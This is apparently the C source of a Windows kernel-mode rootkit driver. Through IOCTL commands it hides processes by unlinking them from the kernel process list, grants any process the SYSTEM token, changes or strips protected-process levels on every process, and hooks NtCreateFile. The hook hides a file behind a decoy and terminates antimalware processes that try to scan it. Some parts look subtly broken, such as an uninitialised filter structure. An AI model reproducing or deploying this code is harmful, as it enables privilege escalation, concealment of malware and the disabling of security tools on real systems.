#include "header.h"


typedef struct protection_levels {
    BYTE PS_PROTECTED_SYSTEM;
    BYTE PS_PROTECTED_WINTCB;
    BYTE PS_PROTECTED_WINDOWS;
    BYTE PS_PROTECTED_AUTHENTICODE;
    BYTE PS_PROTECTED_WINTCB_LIGHT;
    BYTE PS_PROTECTED_WINDOWS_LIGHT;
    BYTE PS_PROTECTED_LSA_LIGHT;
    BYTE PS_PROTECTED_ANTIMALWARE_LIGHT;
    BYTE PS_PROTECTED_AUTHENTICODE_LIGHT;
}protection_level, * Pprotection_levels;


typedef struct eprocess_offsets {
    DWORD Token_offset;
    DWORD ActiveProcessLinks_offset;
    DWORD protection_offset;
}exprocess_offsets, * peprocess_offsets;


protection_level global_protection_levels = {
    .PS_PROTECTED_SYSTEM = 0x72,
    .PS_PROTECTED_WINTCB = 0x62,
    .PS_PROTECTED_WINDOWS = 0x52,
    .PS_PROTECTED_AUTHENTICODE = 0x12,
    .PS_PROTECTED_WINTCB_LIGHT = 0x61,
    .PS_PROTECTED_WINDOWS_LIGHT = 0x51,
    .PS_PROTECTED_LSA_LIGHT = 0x41,
    .PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31,
    .PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11
};


typedef struct x_hooklist {

    BYTE NtOpenFilePatch[12];
    void* NtOpenFileOrigin;
    void* NtOpenFileAddress;
    uintptr_t* NtOpenFileHookAddress;

    BYTE NtCreateFilePatch[12];
    BYTE NtCreateFileOrigin[12];
    void* NtCreateFileAddress;
    uintptr_t* NtCreateFileHookAddress;

    int pID;
    wchar_t filename[MAX_PATH];
    UNICODE_STRING decoyFile;


}hooklist, * Phooklist;

hooklist xHooklist;
exprocess_offsets eoffsets;

NTSTATUS WINAPI FakeNtCreateFile2(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {
    NTSTATUS status = STATUS_UNSUCCESSFUL; 
    int requestorPid = 0x0;
    KMUTEX Mutex;
    KeInitializeMutex(&Mutex, 0);
    KeWaitForSingleObject(&Mutex, Executive, ExGetPreviousMode(), FALSE, NULL);

    __try
    {

        __try {

            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer) {

                // Check if the filename matches the hook list
                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) && !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk")) {

                    PVOID process = NULL;

                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);

                    if (ret != STATUS_SUCCESS)
                    {
                        if (ret == STATUS_INVALID_PARAMETER)
                        {
                            DbgPrint("the process ID was not found.");
                        }
                        if (ret == STATUS_INVALID_CID)
                        {
                            DbgPrint("the specified client ID is not valid.");
                        }
                        return (-1);
                    }

                    RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);

                    ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
                    ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;


                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

                    ObDereferenceObject(process);

                    if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                    {
                        DbgPrint("anti-malware trying to scan it!!\n");

                        NTSTATUS status = ZwTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
                        if (!NT_SUCCESS(status)) {
                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
                        }
                        else {
                            DbgPrint("anti-malware terminated successfully.\n");
                        }
                    }
                    status = IoCreateFile(
                        FileHandle,
                        DesiredAccess,
                        ObjectAttributes,
                        IoStatusBlock,
                        AllocationSize,
                        FileAttributes,
                        ShareAccess,
                        CreateDisposition,
                        CreateOptions,
                        EaBuffer,
                        EaLength,
                        CreateFileTypeNone,
                        (PVOID)NULL,
                        0
                    );

                    return status;
                }
            }

            status = IoCreateFile(
                FileHandle,
                DesiredAccess,
                ObjectAttributes,
                IoStatusBlock,
                AllocationSize,
                FileAttributes,
                ShareAccess,
                CreateDisposition,
                CreateOptions,
                EaBuffer,
                EaLength,
                CreateFileTypeNone,
                (PVOID)NULL,
                0
            );

            return status;
        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }
    __finally {
        KeReleaseMutex(&Mutex, 0);
    }

    return status;
}


NTSTATUS WINAPI FakeNtCreateFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {


    KMUTEX Mutex;
    KeInitializeMutex(&Mutex, 0);
    KeWaitForSingleObject(&Mutex, Executive, ExGetPreviousMode(), FALSE, NULL);

    int requestorPid = 0x0;

    try
    {
        __try {


            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));

            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer)
            {

                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
                {

                    DbgPrint("Blocked : %wZ.\n", ObjectAttributes->ObjectName);

                    FLT_CALLBACK_DATA flt;

                    DbgPrint("requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));

                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID)
                    {

                        DbgPrint("process allowed\n");

                        NTSTATUS FakeStatus = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);

                        write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));

                        return (FakeStatus);
                    }

                    write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));

                    return (STATUS_ACCESS_DENIED);
                }

            }

            NTSTATUS FakeStatus = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));

            return (FakeStatus);
        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
            ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
        {
            DbgPrint("an issue occured while hooking NtCreateFile (Hook Removed ) (%08) \n", GetExceptionCode());

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }
    __finally {
        KeReleaseMutex(&Mutex, 0);
    }
}

DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
{
    if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1) )
    {
        DbgPrint("invalid structure provided \n");
        return (-1);

    }

    if (hooklist_s->NtCreateFileAddress && Option == 1)
    {
        DbgPrint("Hook already active \n");
        return (-1);
    }

    if (hooklist_s->NtCreateFileAddress && Option == 2)
    {

        DbgPrint("Hook already active for NtCreateFile \n");

        if (hooklist_s->NtCreateFileHookAddress != (uintptr_t*)&FakeNtCreateFile2)
        {
            DbgPrint("unhooking ... \n");

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }

    UNICODE_STRING NtCreateFile_STRING = RTL_CONSTANT_STRING(L"NtCreateFile");

    UNICODE_STRING NtOpenFile_STRING = RTL_CONSTANT_STRING(L"NtOpenFile");

    RtlInitUnicodeString(&hooklist_s->decoyFile, L"\\SystemRoot\\System32\\ntoskrnl.exe");

    hooklist_s->NtCreateFileAddress = MmGetSystemRoutineAddress(&NtCreateFile_STRING);

    if (!hooklist_s->NtCreateFileAddress)
    {
        DbgPrint("NtCreateFile NOT resolved\n");

        return (-1);
    }

    memset(hooklist_s->NtCreateFilePatch, 0x0, 12);

    hooklist_s->NtCreateFilePatch[0] = 0x48;
    hooklist_s->NtCreateFilePatch[1] = 0xb8;

    hooklist_s->NtCreateFilePatch[10] = 0xff;
    hooklist_s->NtCreateFilePatch[11] = 0xe0;

    DbgPrint("NtCreateFile resolved\n");

    hooklist_s->NtOpenFileAddress = MmGetSystemRoutineAddress(&NtOpenFile_STRING);

    if (!hooklist_s->NtOpenFileAddress)
    {
        DbgPrint("NtOpenFile NOT resolved\n");

        return (-1);
    }

    memset(hooklist_s->NtOpenFilePatch, 0x0, 12);

    hooklist_s->NtOpenFilePatch[0] = 0x48;
    hooklist_s->NtOpenFilePatch[1] = 0xb8;

    hooklist_s->NtOpenFilePatch[10] = 0xff;
    hooklist_s->NtOpenFilePatch[11] = 0xe0;

    DbgPrint("NtOpenFile resolved\n");

    if (Option == 1)
        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
    else if (Option == 2)
        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
    

    memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));

    memcpy(hooklist_s->NtCreateFileOrigin, hooklist_s->NtCreateFileAddress, 12);

    hooklist_s->pID = rfileinfo.rpid;
    RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));

    write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));

    DbgPrint("Hooks installed resolved\n");

    return (0);
}



DWORD UnprotectAllProcesses() {
    PVOID process = NULL;
    PLIST_ENTRY plist;

    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);

    if (!NT_SUCCESS(ret))
    {
        if (ret == STATUS_INVALID_PARAMETER)
        {
            DbgPrint("the process ID was not found.");
        }
        if (ret == STATUS_INVALID_CID)
        {
            DbgPrint("the specified client ID is not valid.");
        }
        return (-1);
    }

    __try
    {
        plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);

        while (plist->Flink != (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset))
        {
            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);

            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - eoffsets.ActiveProcessLinks_offset + eoffsets.protection_offset;

            *(BYTE*)EProtectionLevel = (BYTE)0;

            plist = plist->Flink;

        }
    }
    __finally {
        ObDereferenceObject(process);
    }

}

DWORD
ChangeProtectionLevel(int pid, BYTE protectionOption)
{
    PVOID process = NULL;

    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);

    if (ret != STATUS_SUCCESS)
    {
        if (ret == STATUS_INVALID_PARAMETER)
        {
            DbgPrint("the process ID was not found.");
        }
        if (ret == STATUS_INVALID_CID)
        {
            DbgPrint("the specified client ID is not valid.");
        }
        return (-1);
    }

    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

    if (*(BYTE*)EProtectionLevel == protectionOption)
    {
        DbgPrint("Protection Level is already set !!");

        return (0);
    }

    *(BYTE*)EProtectionLevel = protectionOption;

    return (0);
}

DWORD
PrivilegeElevationForProcess(
    int pid
)
{
    PVOID process = NULL;
    PVOID sys = NULL;
    PACCESS_TOKEN TargetToken;
    PACCESS_TOKEN sysToken;

    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("the process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the specified client ID is not valid.");
            }
            return (-1);
        }

        ret = PsLookupProcessByProcessId((HANDLE)0x4, &sys); // system handle

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("system process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the system ID is not valid.");
            }

            ObDereferenceObject(process);

            return (-1);
        }
        char* ImageName;

        DbgPrint("target process image name : %s \n", ImageName = PsGetProcessImageFileName((PEPROCESS)process));

        TargetToken = PsReferencePrimaryToken(process);

        if (!TargetToken)
        {
            ObDereferenceObject(sys);
            ObDereferenceObject(process);
            return (-1);
        }

        DbgPrint("%s token : %x\n", ImageName, TargetToken);

        sysToken = PsReferencePrimaryToken(sys);

        if (!sysToken)
        {
            ObDereferenceObject(sys);
            ObDereferenceObject(TargetToken);
            ObDereferenceObject(process);
            return (-1);
        }

        DbgPrint("system token : %x\n", sysToken);

        ULONG_PTR UniqueProcessIdAddress = (ULONG_PTR)process + eoffsets.Token_offset;

        DbgPrint("%s token address  %x\n", ImageName, UniqueProcessIdAddress);

        unsigned long long  UniqueProcessId = *(PHANDLE)UniqueProcessIdAddress;


        ULONG_PTR sysadd = (ULONG_PTR)sys + eoffsets.Token_offset;

        DbgPrint("system token address : %x\n", sysadd);


        *(PHANDLE)UniqueProcessIdAddress = *(PHANDLE)sysadd;

        DbgPrint("process %s Token updated to  :%x ", ImageName, *(PHANDLE)(UniqueProcessIdAddress));

        for (int i = 1; i < 8; i++)
        {
            unsigned char f = *(PHANDLE)(UniqueProcessIdAddress + i);
            DbgPrint(" %x ", f);
        }

        DbgPrint("\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return (-1);
    }

    ObDereferenceObject(sys);
    ObDereferenceObject(TargetToken);
    ObDereferenceObject(sysToken);
    ObDereferenceObject(process);

    return (0);
}


DWORD
HideProcess(
    int pid
)
{

    PVOID process = NULL;

    PLIST_ENTRY plist;
    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&process);

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("The process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("The specified client ID is not valid.");
            }
            return (-1);
        }

        plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);

        ExAcquirePushLockExclusive(&pLock);

        if (plist->Flink == NULL || plist->Blink == NULL)
        {
            ExReleasePushLockExclusive(&pLock);
            __leave;
        }

        if (plist->Flink->Blink != plist || plist->Blink->Flink != plist)
        {
            ExReleasePushLockExclusive(&pLock);
            DbgPrint("Error: Inconsistent Flink and Blink pointers.");
            return (-1);
        }

        plist->Flink->Blink = plist->Blink;
        plist->Blink->Flink = plist->Flink;

        plist->Flink = NULL;
        plist->Blink = NULL;

        ExReleasePushLockExclusive(&pLock);

        DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("An exception occurred while hiding the process.");
        return (-1);
    }

    ObDereferenceObject(process);
    return (0);
}

void
unloadv(
    PDRIVER_OBJECT driverObject
)
{
    if (xHooklist.NtCreateFileAddress)
        write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));

    IoDeleteSymbolicLink(&SymbName);

    IoDeleteDevice(driverObject->DeviceObject);

    DbgPrint("Driver Unloaded\n");
}


NTSTATUS processIoctlRequest(
    DEVICE_OBJECT* DeviceObject,
    IRP* Irp
)
{
    PIO_STACK_LOCATION  pstack = IoGetCurrentIrpStackLocation(Irp);

    int pstatus = 0;
    int inputInt = 0;
    __try
    {
        switch (pstack->Parameters.DeviceIoControl.IoControlCode)
        {
            case HIDE_PROC:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = HideProcess(inputInt);

                DbgPrint("Received input value: %d\n", inputInt);
                break;
            }

            case PRIVILEGE_ELEVATION:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }

                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = PrivilegeElevationForProcess(inputInt);

                DbgPrint("Received input value: %d\n", inputInt);

                break;
            }
            case PROTECTION_LEVEL_SYSTEM:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_SYSTEM);

                DbgPrint("Process Protection changed to WinSystem");
                break;

            }
            case PROTECTION_LEVEL_WINTCB:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINTCB);

                DbgPrint("Process Protection changed to WinTcb");
                break;
            }
            case PROTECTION_LEVEL_WINDOWS:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS);

                DbgPrint("Process Protection changed to Windows");
                break;
            }
            case PROTECTION_LEVEL_AUTHENTICODE:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_AUTHENTICODE);

                DbgPrint("Process Protection changed to Authenticode ");
                break;
            }
            case PROTECTION_LEVEL_WINTCB_LIGHT:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINTCB_LIGHT);

                DbgPrint("Process Protection changed to WinTcb ");
                break;
            }
            case PROTECTION_LEVEL_WINDOWS_LIGHT:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS_LIGHT);

                DbgPrint("Process Protection changed to Windows ");
                break;
            }

            case RESTRICT_ACCESS_TO_FILE_CTL:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                fopera rfileinfo = { 0 };
                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
                pstatus = initializehooklist(&xHooklist, rfileinfo,1);


                DbgPrint("File access restricted ");
                break;
            }
            case BYPASS_INTEGRITY_FILE_CTL:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                fopera rfileinfo = { 0 };
                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));

                pstatus = initializehooklist(&xHooklist, rfileinfo,2);

                DbgPrint("bypass integrity check ");
                break;
            }
            case PROTECTION_LEVEL_LSA_LIGHT:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_LSA_LIGHT);

                DbgPrint("Process Protection changed to Lsa");
                break;
            }
            case PROTECTION_LEVEL_ANTIMALWARE_LIGHT:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT);

                DbgPrint("Process Protection changed to Antimalware ");
                break;
            }
            case PROTECTION_LEVEL_AUTHENTICODE_LIGHT:
            {
                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
                {
                    pstatus = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

                pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_AUTHENTICODE_LIGHT);

                DbgPrint("Process Protection changed to Authenticode ");
                break;
            }
            case UNPROTECT_ALL_PROCESSES:
            {
                pstatus = UnprotectAllProcesses();

                DbgPrint("all Processes Protection has been removed");
                break;
            }
            default:
            {
                DbgPrint("Invalid Buffer ");
                pstatus = STATUS_INVALID_DEVICE_REQUEST;

            }
        }
    }
    __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
        ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {

        if (GetExceptionCode() == STATUS_ACCESS_VIOLATION)
        {
            DbgPrint("Invalid Buffer (STATUS_ACCESS_VIOLATION)");

            KPROCESSOR_MODE prevmode = ExGetPreviousMode();

            if (prevmode == UserMode)
            {
                DbgPrint("possible that the client is attempting to crash the driver, but not if we crash you first :) ");

                FLT_CALLBACK_DATA flcd;
                HANDLE phandle;
                OBJECT_ATTRIBUTES objectattr;
                CLIENT_ID clid;
                clid.UniqueProcess = IoGetRequestorProcessId(Irp);
                InitializeObjectAttributes(&objectattr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                pstatus = ZwOpenProcess(&phandle, DELETE, &objectattr, &clid);

                __try {

                    if (!NT_SUCCESS(pstatus))
                    {
                        DbgPrint("failed to open process (%08X)\n", pstatus);
                    }
                    else
                    {
                        pstatus = ZwTerminateProcess(phandle, 69);

                        if (!NT_SUCCESS(pstatus))
                        {
                            DbgPrint("failed to terminate the requestor process (%08X)\n", pstatus);
                        }
                    }
                }
                __finally {
                    ZwClose(phandle);
                    ObDereferenceObject(&objectattr);
                }
            }
        }
        pstatus = GetExceptionCode();
    }

    memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));

    Irp->IoStatus.Status = pstatus;

    Irp->IoStatus.Information = sizeof(int);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    if (pstatus)
        return (STATUS_UNSUCCESSFUL);

    return (STATUS_SUCCESS);

}

void IRP_MJCreate()
{
    DbgPrint("IRP_CREATED\n");

}

void IRP_MJClose()
{
    DbgPrint("IRP_CLOSED");

}


DWORD InializeOffsets() {
    DWORD dwOffset = 0;
    RTL_OSVERSIONINFOW pversion;

    RtlGetVersion(&pversion);

    if (pversion.dwBuildNumber == 17763) {
        eoffsets.Token_offset = 0x0358;
    }
    else if (pversion.dwBuildNumber == 18362) {
        eoffsets.Token_offset = 0x0360;
    }
    else if (pversion.dwBuildNumber == 19045) {
        eoffsets.Token_offset = 0x04B8;
    }
    else {
        eoffsets.Token_offset = 0;
    }

    if (pversion.dwBuildNumber == 14393) {
        eoffsets.ActiveProcessLinks_offset = 0x02F0;
    }
    else if (pversion.dwBuildNumber >= 15063 && pversion.dwBuildNumber <= 17763) {
        eoffsets.ActiveProcessLinks_offset = 0x0360;
    }
    else if (pversion.dwBuildNumber == 18362) {
        eoffsets.ActiveProcessLinks_offset = 0x02F0;
    }
    else if (pversion.dwBuildNumber == 19045) {
        eoffsets.ActiveProcessLinks_offset = 0x0448;
    }
    else {
        eoffsets.ActiveProcessLinks_offset = 0;
    }

    if (pversion.dwBuildNumber == 10586) {
        eoffsets.protection_offset = 0x06B2;
    }
    else if (pversion.dwBuildNumber == 14393) {
        eoffsets.protection_offset = 0x06C2;
    }
    else if (pversion.dwBuildNumber >= 15063 && pversion.dwBuildNumber <= 17763) {
        eoffsets.protection_offset = 0x06CA;
    }
    else if (pversion.dwBuildNumber == 18362) {
        eoffsets.protection_offset = 0x06FA;
    }
    else if (pversion.dwBuildNumber == 19045) {
        eoffsets.protection_offset = 0x087A;
    }
    else {
        eoffsets.protection_offset = 0;
    }

    if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset && eoffsets.protection_offset)
        return (STATUS_SUCCESS);

    DbgPrint("Unsupported Windows build %lu. Please open an issue in the repository", pversion.dwBuildNumber);

    return (STATUS_UNSUCCESSFUL);
}



NTSTATUS
DriverEntry(
    PDRIVER_OBJECT driverObject,
    PUNICODE_STRING registryPath
)
{
    ExInitializePushLock(&pLock);


    UNREFERENCED_PARAMETER(registryPath);
    UNREFERENCED_PARAMETER(driverObject);

    NTSTATUS status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);

    if (!NT_SUCCESS(status)) {
        DbgPrint(("Failed to create device object (0x%08X)\n", status));
        return (STATUS_UNSUCCESSFUL);
    }
    status = IoCreateSymbolicLink(&SymbName, &DeviceName);

    if (!NT_SUCCESS(status)) {
        DbgPrint(("Failed to create Symbolic link (0x%08X)\n", status));
        IoDeleteDevice(driverObject->DeviceObject);
        return (STATUS_UNSUCCESSFUL);
    }

    if (InializeOffsets())
    {
        DbgPrint("unsupported windows build !\n");
        unloadv(driverObject);
        return (STATUS_UNSUCCESSFUL);
    }

    DbgPrint("offsets initialized\n");

    driverObject->DriverUnload = &unloadv;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = processIoctlRequest;
    driverObject->MajorFunction[IRP_MJ_CREATE] = IRP_MJCreate;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_MJClose;

    return (STATUS_SUCCESS);
}
